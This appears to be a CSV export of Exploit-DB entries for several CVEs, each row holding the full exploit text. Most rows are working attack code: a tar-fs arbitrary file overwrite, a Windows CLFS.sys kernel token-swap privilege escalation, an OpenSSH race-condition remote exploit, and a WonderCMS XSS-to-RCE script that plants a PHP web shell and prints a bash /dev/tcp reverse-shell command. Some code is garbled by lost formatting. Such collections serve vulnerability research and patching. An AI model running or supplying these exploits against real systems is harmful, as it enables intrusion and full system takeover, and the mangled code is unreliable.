cves,cve_counts,date,title,link,text
CVE-2025-24054,"{""CVE-2025-24054"": 1}",2025-05-01,Microsoft - NTLM Hash Disclosure Spoofing (library-ms),https://www.exploit-db.com/exploits/52280,"Exploit title: Microsoft - NTLM Hash Disclosure Spoofing (library-ms) Exploit Author: John Page (aka hyp3rlinx) x.com/hyp3rlinx ISR: ApparitionSec Back in 2018, I reported a "".library-ms"" File NTLM information disclosure vulnerability to MSRC and was told ""it was not severe enough"", that being said I post it anyways. Seven years passed, until other researchers re-reported it. Subsequently this security flaw was finally deemed important by Microsoft and it received CVE-2025-24054, for which I was finally retroactively credited as the original reporter. Circa 2025 updated: <URL> [References] <URL> <URL> <URL> [Network Access] Remote [Original Disclosure Timeline] Vendor Notification: Jun 29, 2018 MSRC Response: Jul 12, 2018 ""risk is not severe enough to justify immediate servicing."" July 14, 2018 : Public Disclosure [+] Disclaimer The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. All content copyright (c). hyp3rlinx"
CVE-2024-42471,"{""CVE-2024-42471"": 1}",2025-04-30,unzip-stream 0.3.1 - Arbitrary File Write,https://www.exploit-db.com/exploits/52276,"Exploit Title: unzip-stream 0.3.1 - Arbitrary File Write Date: 18th April, 2024 Exploit Author: Ardayfio Samuel Nii Aryee Software link: <URL> Version: unzip-stream 0.3.1 Tested on: Ubuntu CVE: CVE-2024-42471 NB: Python's built-in zipfile module has limitations on the arcname parameter. To bypass this restriction, edit the module's source code (zipfile.py) and comment out the following line: arcname = os.path.normpath(os.path.splitdrive(arcname)[1]) For a more detailed explanation, feel free to check out my blog post here: <URL>"
CVE-2024-12905,"{""CVE-2024-12905"": 1}",2025-04-22,tar-fs 3.0.0 - Arbitrary File Write/Overwrite,https://www.exploit-db.com/exploits/52268,"Exploit Title: tar-fs 3.0.0 - Arbitrary File Write/Overwrite Date: 17th April, 2024 Exploit Author: Ardayfio Samuel Nii Aryee Software link: <URL> Version: tar-fs 3.0.0 Tested on: Ubuntu CVE: CVE-2024-12905 Run the command: Example: python3 exploit.py authorizedkeys ../../../../../../../../home/user1/authorizedkeys This will generate two tar file: stage1.tar and stage2.tar Upload stage1.tar first to unarchive the symlink Next, upload stage2.tar to finally write/overwrite the file on the system import os import sys import tarfile linkname = ""normalfile"" def checkarguments(): if len(sys.argv) != 3: print(f""Usage: {sys.argv[0]} \n\ Example: {sys.argv[0]} authorizedkeys ../../../../../../../../home/user1/authorizedkeys\ sys.exit() contentfilepath = sys.argv[1] targetfilepath = sys.argv[2] return contentfilepath, targetfilepath def createsymlink(linkname, targetpath): os.symlink(targetpath, linkname) print(""[+] Created symlink: {linkname} -> {targetpath}"") def archivefiles(archivename, filepath): tar = tarfile.open(archivename, 'w') tar.add(filepath, linkname, recursive=False) tar.close() print(f""[+] Archived to: {archivename}"") def main(): contentpath, targetfile = checkarguments() stage1archivename = ""stage1.tar"" stage2archivename = ""stage2.tar"" createsymlink(linkname, targetfile) archivefiles(stage1archivename, linkname) archivefiles(stage2archivename, contentpath) if name == ""main_"": main()"
CVE-2024-49138,"{""CVE-2024-49138"": 1}",2025-04-22,Microsoft Windows 11 23h2 - CLFS.sys Elevation of Privilege,https://www.exploit-db.com/exploits/52270,"Exploit Title: Microsoft Windows 11 23h2 - CLFS.sys Elevation of Privilege Date: 2025-04-16 Exploit Author: Milad Karimi (Ex3ptionaL) Contact: miladgrayhat.com Zone-H: <URL> MiRROR-H: <URL> CVE: CVE-2024-49138 include include include include include include include include include include include ""resource.h"" define CONTROLBLOCKSIZE 0x400 define OFFSETEXTENDEDSTATE 0x84 define OFFSETIEXTENDEDBLOCK 0x88 define OFFSETIFLUSHBBLOCK 0x8c define CRTSECURENOWARNINGS 1 define POFXPROCESSORNOTIFICATIONOFFSET 0x3aebb0 define DBGKPTRIAGEDUMPRESTORESTATEOFFSET 0x7f06a0 define PSACTIVEPROCESSHEADOFFSET 0xc37f60 define ACTIVEPROCESSLINKSOFFSET 0x448 define UNIQUEPROCESSIDOFFSET 0x440 define TOKENOFFSET 0x4b8 define TOKENPRIVILEGESPRESENTOFFSET 0x40 define TOKENPRIVILEGSENABLEDOFFSET 0x48 pragma comment(lib, ""Clfsw32.lib"") LPVOID GetKernelBaseAddress() { LPVOID drivers[1024]; // Array to hold driver addresses DWORD cbNeeded; // Bytes returned by EnumDeviceDrivers int driverCount; TCHAR driverName[MAXPATH]; if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) { printf(""Failed to enumerate device drivers. Error: %lu\n"", GetLastError()); return (LPVOID)0x0; driverCount = cbNeeded / sizeof(drivers[0]); if (driverCount == 0) { printf(""No device drivers found.\n""); return (LPVOID)0x0; LPVOID kernelBaseAddress = drivers[0]; if (GetDeviceDriverBaseName(kernelBaseAddress, driverName, MAXPATH)) { printf(""Kernel Base Address: 0x%p\n"", kernelBaseAddress); printf(""Kernel Name: %ls\n"", driverName); else { printf(""Failed to retrieve kernel name. Error: %lu\n"", GetLastError()); return kernelBaseAddress; define SystemHandleInformation 0x10 define SystemHandleInformationSize 1024 1024 2 using fNtQuerySystemInformation = NTSTATUS(WINAPI)( ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength using fNtReadVirtualMemory = NTSTATUS(WINAPI)( HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferSize, PULONG NumberOfBytesRead); using fNtWriteVirtualMemory = NTSTATUS(WINAPI)( HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferSize, PULONG NumberOfBytesWritten); fNtReadVirtualMemory NtReadVirtualMemory = NULL; fNtWriteVirtualMemory NtWriteVirtualMemory = NULL; typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO USHORT UniqueProcessId; USHORT CreatorBackTraceIndex; UCHAR ObjectTypeIndex; UCHAR HandleAttributes; USHORT HandleValue; PVOID Object; ULONG GrantedAccess; } SYSTEM_HANDLE_TABLE_ENTRY_INFO, PSYSTEMHANDLETABLEENTRYINFO; typedef struct SYSTEMHANDLEINFORMATION ULONG NumberOfHandles; SYSTEMHANDLETABLEENTRYINFO Handles[1]; } SYSTEMHANDLEINFORMATION, * PSYSTEMHANDLEINFORMATION; PVOID GetKAddrFromHandle(HANDLE handle) { ULONG returnLength = 0; fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L""ntdll""), ""NtQuerySystemInformation""); PSYSTEMHANDLEINFORMATION handleTableInformation = (PSYSTEMHANDLEINFORMATION)HeapAlloc(GetProcessHeap(), HEAPZEROMEMORY, SystemHandleInformationSize); NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLength); ULONG numberOfHandles = handleTableInformation->NumberOfHandles; HeapFree(GetProcessHeap(), 0, handleTableInformation); handleTableInformation = (PSYSTEMHANDLEINFORMATION)HeapAlloc(GetProcessHeap(), HEAPZEROMEMORY, numberOfHandles * sizeof(SYSTEMHANDLETABLEENTRYINFO) + sizeof(SYSTEMHANDLEINFORMATION) + 0x100); NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, numberOfHandles * sizeof(SYSTEMHANDLETABLEENTRYINFO) + sizeof(SYSTEMHANDLEINFORMATION) + 0x100, &returnLength); for (int i = 0; i < handleTableInformation->NumberOfHandles; i++) SYSTEMHANDLETABLEENTRYINFO handleInfo = (SYSTEMHANDLETABLEENTRYINFO)handleTableInformation->Handles[i]; if (handleInfo.HandleValue == (USHORT)handle && handleInfo.UniqueProcessId == GetCurrentProcessId()) return handleInfo.Object; LPVOID gntbase = 0; LPVOID addresstowrite; DWORD64 valuetowrite = 0x0014000000000f00; PSACTIVEPROCESSHEADOFFSET), &eprocess, sizeof(eprocess), NULL); &systemtoken, sizeof(systemtoken), NULL); ACTIVEPROCESSLINKSOFFSET), &eprocess, sizeof(eprocess), NULL); UNIQUEPROCESSIDOFFSET), &pid, sizeof(pid), NULL); ¤ttoken, sizeof(currenttoken), NULL); TOKENPRIVILEGESPRESENTOFFSET), &privileges, 0x8, NULL); TOKENPRIVILEGSENABLEDOFFSET), &privileges, 0x8, NULL); &systemtoken, 0x8, NULL); int main() HMODULE hModule; HRSRC hResource; errnot err; HGLOBAL hLoadedResource; LPVOID pResourceData; DWORD resourceSize; FILE file; DWORD sectorsPerCluster; DWORD bytesPerSector; DWORD numberOfFreeClusters; DWORD totalNumberOfClusters; const char rootPath = ""C:\\""; PVOID marshallingArea = NULL; ULONGLONG pcbContainer = 0; std::wstring logFileName = L""LOG:""; std::wstring inputName = L""C:\\temp\\testlog\\mylogdddd.blf""; logFileName += inputName; DWORD64 buf = 0; ULONG bytesRead = 0; LPVOID PreviousModeAddr = NULL; DWORD threadId = GetCurrentThreadId(); // Get the current thread ID DWORD64 eprocess = 0; DWORD64 systemtoken = 0; DWORD64 currenttoken = 0; DWORD64 pid = 0; BYTE PreviousMode = 0x1; DWORD64 privileges = 0x0000001ff2ffffbc; const char directoryName1 = ""C:\\temp""; const char directoryName2 = ""C:\\temp\\testlog""; HANDLE logHndl = INVALIDHANDLEVALUE; ULONGLONG cbContainer = (ULONGLONG)0x80000; if (CreateDirectoryA(directoryName1, NULL)) { printf(""Directory created successfully: %s\n"", directoryName1); else { DWORD error = GetLastError(); if (error == ERRORALREADYEXISTS) { printf(""The directory already exists: %s\n"", directoryName1); else { printf(""Failed to create the directory. Error code: %lu\n"", error); return 0; if (CreateDirectoryA(directoryName2, NULL)) { printf(""Directory created successfully: %s\n"", directoryName2); else { DWORD error = GetLastError(); if (error == ERRORALREADYEXISTS) { printf(""The directory already exists: %s\n"", directoryName2); else { printf(""Failed to create the directory. Error code: %lu\n"", error); return 0; logHndl = CreateLogFile(logFileName.cstr(), GENERICWRITE | GENERICREAD, FILESHAREREAD | FILESHAREWRITE, NULL, OPENALWAYS, 0); if (logHndl == INVALIDHANDLEVALUE) { printf(""CreateLogFile failed with error %d\n"", GetLastError()); return 0; else { printf(""file opened successfully\n""); if (!AddLogContainer(logHndl, &cbContainer, (LPWSTR)L""C:\\temp\\testlog\\container1"", NULL)) { printf(""AddLogContainer failed with error %d\n"", GetLastError()); else { printf(""AddLogContainer successful\n""); CloseHandle(logHndl); hModule = GetModuleHandle(NULL); if (!hModule) { printf(""Failed to get module handle.\n""); return 1; hResource = FindResource(hModule, MAKEINTRESOURCE(IDRRCDATA1), RTRCDATA); if (!hResource) { printf(""Failed to find resource. Error: %lu\n"", GetLastError()); return 1; printf(""hResource = 0x%p\n"", hResource); hLoadedResource = LoadResource(hModule, hResource); if (!hLoadedResource) { printf(""Failed to load resource. Error: %lu\n"", GetLastError()); return 1; printf(""hResource = 0x%p\n"", hLoadedResource); pResourceData = LockResource(hLoadedResource); if (!pResourceData) { printf(""Failed to lock resource. Error: %lu\n"", GetLastError()); return 1; printf(""pResourceData = 0x%p\n"", pResourceData); resourceSize = SizeofResource(hModule, hResource); if (resourceSize == 0) { printf(""Failed to get resource size. Error: %lu\n"", GetLastError()); return 1; resourceSize contains its size printf(""Resource size: %lu bytes\n"", resourceSize); err = fopens(&file, ""C:\\temp\\testlog\\mylogdddd.blf.blf"", ""wb""); if (err == 0 && file) { fwrite(pResourceData, 1, resourceSize, file); fclose(file); printf(""Resource written to output.bin successfully.\n""); else { printf(""Failed to open output file. Error code: %d\n"", err); gntbase = GetKernelBaseAddress(); NtReadVirtualMemory = (fNtReadVirtualMemory)GetProcAddress(GetModuleHandle(L""ntdll""), ""NtReadVirtualMemory""); NtWriteVirtualMemory = (fNtWriteVirtualMemory)GetProcAddress(GetModuleHandle(L""ntdll""), ""NtWriteVirtualMemory""); if (!NtReadVirtualMemory || !NtWriteVirtualMemory) { printf(""Failed to get addresses for NtReadVirtualMemory or NtWriteVirtualMemory\n""); return -1; printf(""NtReadVirtualMemory = 0x%p\n"", (DWORD64)NtReadVirtualMemory); printf(""NtWriteVirtualMemory = 0x%p\n"", (DWORD64)NtWriteVirtualMemory); HANDLE threadHandle = OpenThread(THREADALLACCESS, FALSE, threadId); if (threadHandle == NULL) { printf(""Failed to get real handle to the current thread. Error: %lu\n"", GetLastError()); return 1; addresstowrite = (LPVOID)((DWORD64)(GetKAddrFromHandle(threadHandle)) + 0x232); auto pcclfscontainer = VirtualAlloc((LPVOID)0x2100000, 0x1000, MEMRESERVE | MEMCOMMIT, PAGEREADWRITE); memset(pcclfscontainer, 0, 0x1000); auto vtable = (DWORD64)pcclfscontainer + 0x100; auto rcx = pcclfscontainer; *(PDWORD64)((PCHAR)rcx + 0x40) = (DWORD64)pcclfscontainer + 0x200; *(PDWORD64)((PCHAR)pcclfscontainer + 0x200 + 0x68) = (DWORD64)gntbase + DBGKPTRIAGEDUMPRESTORESTATEOFFSET; *(PDWORD64)((PCHAR)rcx + 0x48) = (DWORD64)pcclfscontainer + 0x300; auto argDBGKPTRIAGEDUMPRESTORESTATE = (DWORD64)pcclfscontainer + 0x300; It writes at offset 0x2078 of where ((PDWORD64)(arg_DBGKPTRIAGEDUMPRESTORESTATE)) = (DWORD64)address_to_write - 0x2078; ((PDWORD64)((PCHAR)argDBGKPTRIAGEDUMPRESTORESTATE + 0x10)) = 0x0014000000000f00; ((PDWORD64)vtable)[1] = (DWORD64)gntbase + POFXPROCESSORNOTIFICATIONOFFSET; *(PDWORD64)pcclfscontainer = (DWORD64)vtable; printf(""pcclfscontainer = 0x%p\n"", (DWORD64)pcclfscontainer); printf(""addresstowrite = 0x%p\n"", (DWORD64)addresstowrite); HANDLE processHandle = GetCurrentProcess(); // Get the current process handle if (SetPriorityClass(processHandle, REALTIMEPRIORITYCLASS)) { printf(""Process priority set to REALTIMEPRIORITYCLASS.\n""); else { DWORD error = GetLastError(); printf(""Failed to set process priority. Error code: %lu\n"", error); return 1; threadHandle = GetCurrentThread(); if (SetThreadPriority(threadHandle, THREADPRIORITYTIMECRITICAL)) { printf(""Thread priority set to the highest level: TIMECRITICAL.\n""); else { DWORD error = GetLastError(); printf(""Failed to set thread priority. Error code: %lu\n"", error); return 1; printf(""triggering vuln.""); logHndl = CreateLogFile(logFileName.cstr(), GENERICWRITE | GENERICREAD, FILESHAREREAD | FILESHAREWRITE, NULL, OPENALWAYS, 0); if (logHndl == INVALIDHANDLEVALUE) { printf(""CreateLogFile failed with error %d\n"", GetLastError()); else { printf(""file opened successfully\n""); if (SetPriorityClass(processHandle, NORMALPRIORITYCLASS)) { printf(""Process priority set to NORMALPRIORITYCLASS.\n""); else { DWORD error = GetLastError(); printf(""Failed to set process priority. Error code: %lu\n"", error); return 1; if (SetThreadPriority(threadHandle, THREADPRIORITYNORMAL)) { printf(""Thread priority set to the highest level: THREADPRIORITYNORMAL.\n""); else { DWORD error = GetLastError(); printf(""Failed to set thread priority. Error code: %lu\n"", error); return 1; printf(""vuln triggered\n""); printf(""reading base of ntoskrnl to check we have arbitrary read/write\n""); NtReadVirtualMemory((HANDLE)-1, gntbase, &buf, sizeof(buf), NULL); printf(""buf = 0x%p\n"", (DWORD64)buf); printf(""swapping tokens.\n""); NtReadVirtualMemory((HANDLE)-1, (LPVOID)((DWORD64)gntbase + PSACTIVEPROCESSHEADOFFSET), &eprocess, sizeof(eprocess), NULL); eprocess = eprocess - ACTIVEPROCESSLINKSOFFSET; NtReadVirtualMemory((HANDLE)-1, (LPVOID)(eprocess + TOKENOFFSET), &systemtoken, sizeof(systemtoken), NULL); while (1) { NtReadVirtualMemory((HANDLE)-1, (LPVOID)(eprocess + ACTIVEPROCESSLINKSOFFSET), &eprocess, sizeof(eprocess), NULL); eprocess -= ACTIVEPROCESSLINKSOFFSET; NtReadVirtualMemory((HANDLE)-1, (LPVOID)(eprocess + UNIQUEPROCESSIDOFFSET), &pid, sizeof(pid), NULL); if (pid == (DWORD64)GetCurrentProcessId()) break; printf(""current token address = 0x%p\n"", eprocess + TOKENOFFSET); printf(""systemtoken = 0x%p\n"", systemtoken); printf(""Overwriting process token..\n""); NtWriteVirtualMemory((HANDLE)-1, (LPVOID)(eprocess + TOKENOFFSET), &systemtoken, sizeof(systemtoken), NULL); printf(""token swapped. Restoring PreviousMode and spawning system shell.\n""); PreviousModeAddr = addressto_write; PreviousMode = 0x1; NtWriteVirtualMemory((HANDLE)-1, PreviousModeAddr, &PreviousMode, sizeof(PreviousMode), NULL); system(""cmd.exe""); return 0;"
CVE-2024-21338,"{""CVE-2024-21338"": 1}",2025-04-22,Microsoft Windows 11 - Kernel Privilege Escalation,https://www.exploit-db.com/exploits/52275,"Exploit Title: Microsoft Windows 11 - Kernel Privilege Escalation Date: 2025-04-16 Exploit Author: Milad Karimi (Ex3ptionaL) Contact: miladgrayhat.com Zone-H: <URL> Tested on: Win, Ubuntu CVE : CVE-2024-21338 include ""pch.hpp"" include """
CVE-2024-6387,"{""CVE-2024-6387"": 1}",2025-04-22,OpenSSH server (sshd) 9.8p1 - Race Condition,https://www.exploit-db.com/exploits/52269,"Exploit Title : OpenSSH server (sshd) 9.8p1 - Race Condition Author : Milad Karimi (Ex3ptionaL) Date : 2025-04-16 Description: Targets a signal handler race condition in OpenSSH's server (sshd) on glibc-based Linux systems. It exploits a vulnerability where the SIGALRM handler calls async-signal-unsafe functions, leading to rce as root. Notes: 1. Shellcode : Replace placeholder with actual payload. 2. GLIBC_BASES : Needs adjustment for specific target systems. 3. Timing parameters: Fine-tune based on target system responsiveness. 4. Heap layout : Requires tweaking for different OpenSSH versions. 5. File structure offsets: Verify for the specific glibc version. include include include include include include include include include include include include define MAXPACKETSIZE (256 1024) define LOGIN_GRACE_TIME 120 define MAX_STARTUPS 100 define CHUNK_ALIGN(s) (s) + 15) & ~15) uint64_t GLIBC_BASES[] = { 0xb7200000, 0xb7400000 }; int NUM_GLIBC_BASES = sizeof (GLIBC_BASES) / sizeof (GLIBC_BASES[0]); unsigned char shellcode[] = ""\x90\x90\x90\x90""; int setup_connection (const char ip, int port); void sendpacket (int sock, unsigned char packettype, const unsigned char data, size_t len); void prepare_heap (int sock); void time_final_packet (int sock, double parsingtime); int attemptracecondition (int sock, double parsingtime, uint64t glibcbase); double measureresponsetime (int sock, int errortype); void createpublickeypacket (unsigned char packet, size_t size, uint64_t glibc_base); void create_fake_file_structure (unsigned char data, sizet size, uint64t glibcbase); void sendsshversion (int sock); int receivesshversion (int sock); void sendkexinit (int sock); int receivekexinit (int sock); int performsshhandshake (int sock); int main (int argc, char *argv[]) if (argc != 3) fprintf (stderr, ""Usage: %s \n"", argv[0]); exit (1); const char *ip = argv[1]; int port = atoi (argv[2]); double parsingtime = 0; int success = 0; srand (time (NULL)); for (int baseidx = 0; baseidx < NUMGLIBCBASES && !success; baseidx++) uint64t glibcbase = GLIBCBASES[baseidx]; printf (""Attempting exploitation with glibc base: 0x%lx\n"", glibcbase); for (int attempt = 0; attempt < 20000 && !success; attempt++) if (attempt % 1000 == 0) printf (""Attempt %d of 20000\n"", attempt); int sock = setupconnection (ip, port); if (sock < 0) fprintf (stderr, ""Failed to establish connection, attempt %d\n"", attempt); continue; if (performsshhandshake (sock) < 0) fprintf (stderr, ""SSH handshake failed, attempt %d\n"", attempt); close (sock); continue; prepareheap (sock); timefinalpacket (sock, &parsingtime); if (attemptracecondition (sock, parsingtime, glibcbase)) printf (""Possible exploitation success on attempt %d with glibc "" ""base 0x%lx!\n"", attempt, glibcbase); success = 1; break; close (sock); usleep (100000); // 100ms delay between attempts, as mentioned in the return !success; int setupconnection (const char *ip, int port) int sock = socket (AFINET, SOCKSTREAM, 0); if (sock < 0) perror (""socket""); return -1; struct sockaddrin serveraddr; memset (&serveraddr, 0, sizeof (serveraddr)); serveraddr.sinfamily = AFINET; serveraddr.sinport = htons (port); if (inetpton (AFINET, ip, &serveraddr.sinaddr) <= 0) perror (""inetpton""); close (sock); return -1; if (connect (sock, (struct sockaddr *)&serveraddr, sizeof (serveraddr)) < 0) perror (""connect""); close (sock); return -1; int flags = fcntl (sock, FGETFL, 0); fcntl (sock, FSETFL, flags | ONONBLOCK); return sock; void sendpacket (int sock, unsigned char packettype, const unsigned char data, size_t len) unsigned char packet[MAX_PACKET_SIZE]; size_t packet_len = len + 5; packet[0] = (packet_len >> 24) & 0xFF; packet[1] = (packet_len >> 16) & 0xFF; packet[2] = (packet_len >> 8) & 0xFF; packet[3] = packet_len & 0xFF; packet[4] = packet_type; memcpy (packet + 5, data, len); if (send (sock, packet, packet_len, 0) < 0) perror (""send_packet""); void send_ssh_version (int sock) const char sshversion = ""SSH-2.0-OpenSSH8.9p1 Ubuntu-3ubuntu0.1\r\n""; if (send (sock, sshversion, strlen (sshversion), 0) < 0) perror (""send ssh version""); int receivesshversion (int sock) char buffer[256]; ssizet received; do received = recv (sock, buffer, sizeof (buffer) - 1, 0); while (received < 0 && (errno == EWOULDBLOCK || errno == EAGAIN)); if (received > 0) buffer[received] = '\0'; printf (""Received SSH version: %s"", buffer); return 0; else if (received == 0) fprintf (stderr, ""Connection closed while receiving SSH version\n""); else perror (""receive ssh version""); return -1; void sendkexinit (int sock) unsigned char kexinitpayload[36] = { 0 }; sendpacket (sock, 20, kexinitpayload, sizeof (kexinitpayload)); int receivekexinit (int sock) unsigned char buffer[1024]; ssizet received; do received = recv (sock, buffer, sizeof (buffer), 0); while (received < 0 && (errno == EWOULDBLOCK || errno == EAGAIN)); if (received > 0) printf (""Received KEXINIT (%zd bytes)\n"", received); return 0; else if (received == 0) fprintf (stderr, ""Connection closed while receiving KEXINIT\n""); else perror (""receive kex init""); return -1; int performsshhandshake (int sock) sendsshversion (sock); if (receivesshversion (sock) < 0) return -1; sendkexinit (sock); if (receivekexinit (sock) < 0) return -1; return 0; void prepareheap (int sock) for (int i = 0; i < 10; i++) unsigned char tcachechunk[64]; memset (tcachechunk, 'A', sizeof (tcachechunk)); sendpacket (sock, 5, tcachechunk, sizeof (tcachechunk)); for (int i = 0; i < 27; i++) unsigned char largehole[8192]; memset (largehole, 'B', sizeof (largehole)); sendpacket (sock, 5, largehole, sizeof (largehole)); unsigned char smallhole[320]; memset (smallhole, 'C', sizeof (smallhole)); sendpacket (sock, 5, smallhole, sizeof (smallhole)); for (int i = 0; i < 27; i++) unsigned char fakedata[4096]; createfakefilestructure (fakedata, sizeof (fakedata), GLIBCBASES[0]); sendpacket (sock, 5, fakedata, sizeof (fakedata)); unsigned char largestring[MAXPACKETSIZE - 1]; memset (largestring, 'E', sizeof (largestring)); sendpacket (sock, 5, largestring, sizeof (largestring)); void createfakefilestructure (unsigned char data, size_t size, uint64_t glibc_base) memset (data, 0, size); struct void IOreadptr; void *IOreadend; void _IO_read_base; void IOwritebase; void *IOwriteptr; void _IO_write_end; void IObufbase; void *IObufend; void _IO_save_base; void IObackupbase; void *IOsaveend; void _markers; void chain; int fileno; int flags; int mode; char unused2[40]; void *vtableoffset; } *fakefile = (void )data; fake_file->_vtable_offset = (void )0x61; (uint64_t )(data + size - 16) = glibcbase + 0x21b740; // fake vtable (IOwfilejumps) (uint64_t )(data + size - 8) = glibcbase + 0x21d7f8; // fake codecvt void timefinalpacket (int sock, double parsing_time) double time_before = measure_response_time (sock, 1); double time_after = measure_response_time (sock, 2); parsingtime = timeafter - timebefore; printf (""Estimated parsing time: %.6f seconds\n"", *parsingtime); double measureresponsetime (int sock, int errortype) unsigned char errorpacket[1024]; sizet packetsize; if (errortype == 1) packetsize = snprintf ((char )error_packet, sizeof (error_packet), ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3""); else packet_size = snprintf ((char )errorpacket, sizeof (errorpacket), ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAQQDZy9""); struct timespec start, end; clockgettime (CLOCKMONOTONIC, &start); sendpacket (sock, 50, errorpacket, packetsize); // SSHMSGUSERAUTHREQUEST char response[1024]; ssizet received; do received = recv (sock, response, sizeof (response), 0); while (received < 0 && (errno == EWOULDBLOCK || errno == EAGAIN)); clockgettime (CLOCKMONOTONIC, &end); double elapsed = (end.tvsec - start.tvsec) + (end.tvnsec - start.tvnsec) / 1e9; return elapsed; void createpublickeypacket (unsigned char packet, size_t size, uint64_t glibc_base) memset (packet, 0, size); size_t offset = 0; for (int i = 0; i < 27; i++) (uint32t *)(packet + offset) = CHUNKALIGN (4096); offset += CHUNKALIGN (4096); *(uint32t )(packet + offset) = CHUNK_ALIGN (304); offset += CHUNK_ALIGN (304); memcpy (packet, ""ssh-rsa "", 8); memcpy (packet + CHUNK_ALIGN (4096) 13 + CHUNKALIGN (304) * 13, shellcode, sizeof (shellcode)); for (int i = 0; i < 27; i++) createfakefilestructure (packet + CHUNKALIGN (4096) * (i + 1) + CHUNKALIGN (304) i, CHUNK_ALIGN (304), glibc_base); int attempt_race_condition (int sock, double parsing_time, uint64_t glibc_base) unsigned char final_packet[MAX_PACKET_SIZE]; create_public_key_packet (final_packet, sizeof (final_packet), glibc_base); if (send (sock, final_packet, sizeof (final_packet) - 1, 0) < 0) perror (""send final packet""); return 0; struct timespec start, current; clock_gettime (CLOCK_MONOTONIC, &start); while (1) clock_gettime (CLOCK_MONOTONIC, ¤t); double elapsed = (current.tv_sec - start.tv_sec) + (current.tv_nsec - start.tv_nsec) / 1e9; if (elapsed >= (LOGIN_GRACE_TIME - parsing_time - 0.001)) { // 1ms before SIGALRM if (send (sock, &final_packet[sizeof (final_packet) - 1], 1, 0) < 0) perror (""send last byte""); return 0; break; char response[1024]; ssize_t received = recv (sock, response, sizeof (response), 0); if (received > 0) printf (""Received response after exploit attempt (%zd bytes)\n"", received); if (memcmp (response, ""SSH-2.0-"", 8) != 0) printf (""Possible hit on 'large' race window\n""); return 1; else if (received == 0) printf ( ""Connection closed by server - possible successful exploitation\n""); return 1; else if (errno == EWOULDBLOCK || errno == EAGAIN) printf (""No immediate response from server - possible successful "" ""exploitation\n""); return 1; else perror (""recv""); return 0; int perform_exploit (const char ip, int port) int success = 0; double parsingtime = 0; double timingadjustment = 0; for (int baseidx = 0; baseidx < NUMGLIBCBASES && !success; baseidx++) uint64t glibcbase = GLIBCBASES[baseidx]; printf (""Attempting exploitation with glibc base: 0x%lx\n"", glibcbase); for (int attempt = 0; attempt < 10000 && !success; attempt++) if (attempt % 1000 == 0) printf (""Attempt %d of 10000\n"", attempt); int sock = setupconnection (ip, port); if (sock < 0) fprintf (stderr, ""Failed to establish connection, attempt %d\n"", attempt); continue; if (performsshhandshake (sock) < 0) fprintf (stderr, ""SSH handshake failed, attempt %d\n"", attempt); close (sock); continue; prepareheap (sock); timefinalpacket (sock, &parsingtime); parsingtime += timingadjustment; if (attemptracecondition (sock, parsingtime, glibcbase)) printf (""Possible exploitation success on attempt %d with glibc "" ""base 0x%lx!\n"", attempt, glibcbase); success = 1; the else timing_adjustment += 0.00001; // Small incremental adjustment close (sock); usleep (100000); // 100ms delay between attempts, as mentioned in the return success;"
CVE-2023-41425,"{""CVE-2023-41425"": 1}",2025-04-22,WonderCMS 3.4.2 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52271,"Exploit Title: WonderCMS 3.4.2 - Remote Code Execution (RCE) Date: 2025-04-16 Exploit Author: Milad Karimi (Ex3ptionaL) Contact: miladgrayhat.com Zone-H: <URL> MiRROR-H: <URL> CVE: CVE-2023-41425 import requests import argparse from argparse import RawTextHelpFormatter import os import subprocess import zipfile from termcolor import colored def main(): parser = argparse.ArgumentParser(description=""Exploit Wonder CMS v3.4.2 XSS to RCE"", formatterclass=RawTextHelpFormatter) parser.addargument(""--url"", required=True, help=""Target URL of loginURL (Example: <URL> parser.addargument(""--xip"", required=True, help=""IP for HTTP web server that hosts the malicious .js file"") parser.addargument(""--xport"", required=True, help=""Port for HTTP web server that hosts the malicious .js file"") args = parser.parseargs() targetloginurl = args.url targetsplit = args.url.split('/') targeturl = targetsplit[0] + '//' + targetsplit[2] Web Shell print(""[+] Creating PHP Web Shell"") if not os.path.exists('malicious'): os.mkdir('malicious') with open ('malicious/malicious.php', 'w') as f: f.write(' ') with zipfile.ZipFile('./malicious.zip', 'w') as z: z.write('malicious/malicious.php') os.remove('malicious/malicious.php') os.rmdir('malicious') else: print(colored(""[!] Directory malicious already exists!"", 'yellow')) Malicious .js js = f'var token = document.querySelectorAll('[name=""token""]')[0].value; var moduleurl = ""{targeturl}/?installModule= <URL> + token; var xhr = new XMLHttpRequest(); xhr.withCredentials = true; xhr.open(""GET"", moduleurl); xhr.send();' print(""[+] Writing malicious.js"") with open('malicious.js', 'w') as f: f.write(js) xsspayload = args.url.replace(""loginURL"", ""index.php?page=loginURL?"")+""\""> "", 'red')) print(""[+] To get a reverse shell connection run the following:"") print(colored(f""curl -s '{targeturl}/themes/malicious/malicious.php' --get --data-urlencode \""cmd=bash -c 'bash -i >& /dev/tcp/ / 0>&1'\"" "", 'yellow')) print(""[+] Starting HTTP server"") subprocess.run([""python3"", ""-m"", ""http.server"", ""-b"", args.xip, args.xport]) if name == ""main"": main()"
